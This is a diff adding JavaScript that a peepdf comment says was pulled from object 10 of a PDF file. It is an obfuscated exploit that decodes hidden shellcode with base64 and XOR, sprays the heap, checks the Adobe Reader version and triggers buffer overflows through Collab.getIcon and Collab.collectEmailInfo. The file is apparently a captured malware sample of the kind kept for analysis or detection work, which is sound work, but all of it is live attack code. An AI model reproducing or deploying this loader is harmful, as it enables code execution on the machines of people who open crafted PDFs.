@@ -1,0 +1,148 @@
+// peepdf comment: Javascript code located in object 10 (version 0)
+
+                            var imJatA6Q1 = 1;
+
+                            function zjyat(count, y0d7hTk) {
+                                var KKARG = "";
+                                while (--count >= 0) KKARG += y0d7hTk;
+                                return KKARG;
+                            };
+                            var ihNc9H;
+                            var V3q32jr = 0;
+
+                            function RxIL6jHFexe(VDS17) {
+                                var e7dbUxw9 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+                                var F6gvH3eMJB, CGSTt6DlSb, I7FMkSOuKaE, AysouyqIJ, result = [];
+                                for (AysouyqIJ = 0; AysouyqIJ < VDS17.length; AysouyqIJ++) {
+                                    if (VDS17.charAt(AysouyqIJ) == "=") {
+                                        break;
+                                    }
+                                    F6gvH3eMJB = e7dbUxw9.indexOf(VDS17.charAt(AysouyqIJ));
+                                    I7FMkSOuKaE = AysouyqIJ % 4;
+                                    switch (I7FMkSOuKaE) {
+                                    case 1:
+                                        result.push(String.fromCharCode(CGSTt6DlSb << 2 | F6gvH3eMJB >> 4));
+                                        break;
+                                    case 2:
+                                        result.push(String.fromCharCode((CGSTt6DlSb & 0x0f) << 4 | F6gvH3eMJB >> 2));
+                                        break;
+                                    case 3:
+                                        result.push(String.fromCharCode((CGSTt6DlSb & 3) << 6 | F6gvH3eMJB));
+                                        break;
+                                    }
+                                    CGSTt6DlSb = F6gvH3eMJB;
+                                }
+                                return result.join("");
+                            };
+
+                            function qm23Ab0z(Op1HGo) {
+                                var VDS17;
+                                var BJfLs4m4j8J = "",
+                                    yec3gULKh = 0;
+                                if (!V3q32jr) {
+                                    ihNc9H = new Array(0x91, 0xf0, 0xa9, 0xf3, 0x8a, 0x95, 0xe3, 0xcf);
+                                    V3q32jr = 8;
+                                }
+                                VDS17 = RxIL6jHFexe(Op1HGo);
+                                var yec3gULKh = VDS17.length;
+                                for (var AysouyqIJ = 0; AysouyqIJ < yec3gULKh; AysouyqIJ++) {
+                                    var uBpT75 = VDS17.charCodeAt(AysouyqIJ);
+                                    var hGuv0F = uBpT75 ^ ihNc9H[AysouyqIJ % V3q32jr];
+                                    BJfLs4m4j8J += String.fromCharCode(hGuv0F);
+                                }
+                                return BJfLs4m4j8J;
+                            };
+                            var cpzjThfR = 0;
+
+                            function JffJfayu(Eryh87VkfC, PLeFRfq) {
+                                var Iv7AFq9Gd27 = 1,
+                                    mCFuSrPGO, J7vH1o7;
+                                while (Eryh87VkfC.length * 2 < PLeFRfq && Iv7AFq9Gd27 == 1) {
+                                    mCFuSrPGO += Iv7AFq9Gd27;
+                                    Eryh87VkfC += Eryh87VkfC;
+                                    J7vH1o7 = mCFuSrPGO / 25 + mCFuSrPGO % 17;
+                                }
+                                mCFuSrPGO += J7vH1o7;
+                                Eryh87VkfC = Eryh87VkfC.substring(0, PLeFRfq / 2);
+                                J7vH1o7 = Iv7AFq9Gd27;
+                                return Eryh87VkfC;
+                            };
+
+                            function OUpSs4NKzk(cnV7I7f) {
+                                if (cpzjThfR > 0) {
+                                    return;
+                                }
+                                var dN9lsEl = 0x033C0000;
+                                var U6AAf = unescape(qm23Ab0z('tIXMkb+gxrqiw5+Wr+DV+/LAjIa+pduttIWRxrmlxrqmyMrDr+DW+aGUjIa+pduttIWRkbr2xrqgk57Dr+DbrfCUjIa6rdf/tIXKwL/wxrqlwJGRr+Db/KLEjIa99oD/tIWdw7L3xrryw5qQr+DbrafAjIa4odWs') + qm23Ab0z('tIWRkbihxrqik53Gr+DUrKmSjIa9rdP6tIXPl7qmxrqllpGRr+DbraDIjIa4pdaptIXNl7qmxrqiw8zAr+DbraXJjIay99D7tIXPxrqmxrrywJrAr+CFrKjJjIayoYKstIWex+mlxrrywZnEr+DTq/KRjIbupdP8') + qm23Ab0z('tIXPx+/3xrqkxJqRr+DR96PEjIbvp9T6tIWclbL3xrqhw5vHr+DV+fWUjIa69tuttIWRkb73xrqgk5yVr+CHq6HDjIa6oduttIWZwLL3xrqpycrGr+DR+6XEjIa8pNKstIXMkemmxrrwlJzBr+DW/aTAjIbrrIb3') + qm23Ab0z('tIXPlezzxrqpyc+Vr+Db/KHHjIa6rYD7tIXKxLKmxrqikpnHr+DU+vfBjIbppoastIWdlrLwxrr0k5mWr+DS+PDFjIa99tP+tIWeyrvzxrr0yJmSr+Da+PeSjIa684WrtIXKkrmmxrqkkpGSr+DX9vPAjIbu99Gr') + qm23Ab0z('tIWdx7isxrqkx8zLr+CGq6XJjIa98NOptIWdkbL3xrqklszAr+Db/KSVjIa99oastIXMkLL3xrqlk8zLr+CFqfeWjIay94WptIXMke6lxrr0kpnBr+CG96HFjIbs84X2tIXPlezzxrr0kpzLr+CGraHCjIay8dX5') + qm23Ab0z('tIWdw73xxrqpwMjHr+CFqaaVjIa9oIWptIWdleysxrqgx8/Fr+CF/6mSjIbv8Nv8tIXPlrn0xrqhxp2Wr+DUq6mUjIay99P7tIWRwOnwxrqgyMrCr+DbrvTIjIbs84WptIWRwOzzxrqhk8rCr+DT/vPIjIa8oNWq') + qm23Ab0z('tIXKwr2hxrqhyM/Lr+DV96TAjIa8rNT4tIWfyrzwxrr1k5GRr+DW/aTBjIbs89b8tIWZx7+gxrqkyZySr+CH/6mSjIa8rYb3tIXPlezzxrqiw8+Vr+DW//LAjIa/pdb/tIWcw7+lxrqkxc+Vr+Db9qCTjIa5odf6') + qm23Ab0z('tIXKw7mmxrqkwJzDr+DW/6TAjIa/8durtIWcwL6lxrqmxc+Vr+CFqaLEjIa4pdb6tIWdxrKsxrr0kprLr+CG9qHFjIa6pduptIWZw7qlxrr1xZGRr+CA/anBjIa6pYX/tIWZw7qlxrqkxZHKr+DW/aLAjIbppdX3') + qm23Ab0z('tIWZw7qlxrr3lpnDr+DS+6TFjIa/oNuttIWZwLmlxrrzyM3Dr+DQ/qbBjIa8odGqtIWZwbKsxrrywJrAr+DVrPPIjIa6pdWstIWRyrqlxrqhxJ3Br+CA/6LDjIbopdb/tIWcw7KnxrqhwsvDr+DQ/aTAjIa/pYD/') + qm23Ab0z('tIXLw7+lxrrywZ3Dr+DS9/TAjIbs89b/tIWaw72gxrqkxc+Vr+Db/KHIjIbs84X3tIXLy72hxrqlxZHKr+DQ/KKTjIa8o4D/tIWZkOitxrqjkpnCr+DbrfTAjIay8YX7tIWZx7/wxrqnxpzAr+DT+/PIjIa/pdP+') + qm23Ab0z('tIWdxbLxxrqkwJnLr+DU+veWjIbs89D3tIWbx7+gxrqlxpGRr+Db+qHEjIa9oYD/tIWawLujxrqkwMrDr+DX+amUjIa/pdP7tIWexezzxrqplJnHr+DT96XGjIbs89b/tIWakL2gxrqkxc+Vr+CGraGTjIbs84f/') + qm23Ab0z('tIWakL2gxrqkxc+Vr+DQ/KDAjIbv94D/tIXMkbqnxrr3lpmVr+DQ/6bFjIa/oIWptIWRwLqhxrqhkcrDr+CFqaTAjIa7rdb6tIXPxO/3xrr1xczLr+CFqfeVjIa8rYWptIWex72hxrqikZ7Dr+DRqaOWjIa9odWq') + qm23Ab0z('tIWawbmkxrqnw5uWr+DRqqeWjIa88NX2tIWawrjzxrr3ls+V'));
+                                var O2uB = 0x400000;
+                                var shmnee7 = U6AAf.length * 2;
+                                var PLeFRfq = O2uB - (shmnee7 + 0x38 + 2);
+                                var Eryh87VkfC = unescape(qm23Ab0z('tIWYkLv2xrqgk5iQr+DSrKCTjIa79tKstIWYkLv2xrqgk5iQr+DSrKCTjIa79tKs'));
+                                Eryh87VkfC = JffJfayu(Eryh87VkfC, PLeFRfq);
+                                y2Rm16I9jhp = (cnV7I7f - dN9lsEl) / O2uB;
+                                NcmqA = new Array();
+                                var UAjVtG = unescape(qm23Ab0z('tIWQw7Ol'));
+                                try {
+                                    for (i = 0; i < y2Rm16I9jhp; i++) {
+                                        NcmqA[i] = Eryh87VkfC + UAjVtG + U6AAf;
+                                    }
+                                    cpzjThfR = 1;
+                                } catch (e) {};
+                                cpzjThfR = 1;
+                            };
+
+                            function fnLKIOSeaFS() {
+                                var AQUQzhbnjJQ;
+                                var a = 0;
+                                var b = 0;
+                                var rypg819HE3 = 0;
+                                var vpgCkrQS = 0;
+                                try {
+                                    var OruatTB = app.viewerVersion.toString().split(".");
+                                    a = OruatTB[0];
+                                    if (OruatTB.length > 1) {
+                                        a = OruatTB[0];
+                                        b = OruatTB[1].substr(0, 1);
+                                        var rypg819HE3 = OruatTB[1].substr(1, 1);
+                                        if (!rypg819HE3) {
+                                            rypg819HE3 = 0;
+                                        }
+                                        var vpgCkrQS = OruatTB[1].substr(2, 1);
+                                        if (!vpgCkrQS) {
+                                            vpgCkrQS = rypg819HE3;
+                                            rypg819HE3 = 0;
+                                        }
+                                    }
+                                    AQUQzhbnjJQ = parseInt(vpgCkrQS) + parseInt(rypg819HE3) * 10 + parseInt(b) * 100 + parseInt(a) * 1000;
+                                } catch (e) {}
+                                return AQUQzhbnjJQ;
+                            };
+                            var d7OBT1mav7 = fnLKIOSeaFS();
+                            var LQCGK;
+
+                            function aMvpbP4d7() {
+                                app.doc.Collab.getIcon('N.' + LQCGK);
+                            };
+
+                            function aMvpaP4d7() {
+                                Collab.collectEmailInfo({
+                                    msg: zjyat(4096, unescape(qm23Ab0z('tIWZkLr2xrqhk5mQ')))
+                                });
+                            };
+                            if ((d7OBT1mav7 >= 8000 && d7OBT1mav7 <= 8102) || (d7OBT1mav7 >= 9000 && d7OBT1mav7 < 9100)) {
+                                if (d7OBT1mav7 < 9000) {
+                                    OUpSs4NKzk(0x0C0C0C0C);
+                                    LQCGK = unescape(qm23Ab0z('tMDq1rrWxv/S1Zmw'));
+                                } else {
+                                    OUpSs4NKzk(0x1C1C1C1C);
+                                    LQCGK = unescape(qm23Ab0z('tMHq1rvWxv7S1Ziw'));
+                                }
+                                while (LQCGK.length < 0x4000) {
+                                    LQCGK += LQCGK;
+                                }
+                                aMvpbP4d7();
+                            } else if ((d7OBT1mav7 >= 5000 && d7OBT1mav7 < 7100)) {
+                                OUpSs4NKzk(0x0C0C0C0C);
+                                aMvpaP4d7();
+                            }
+
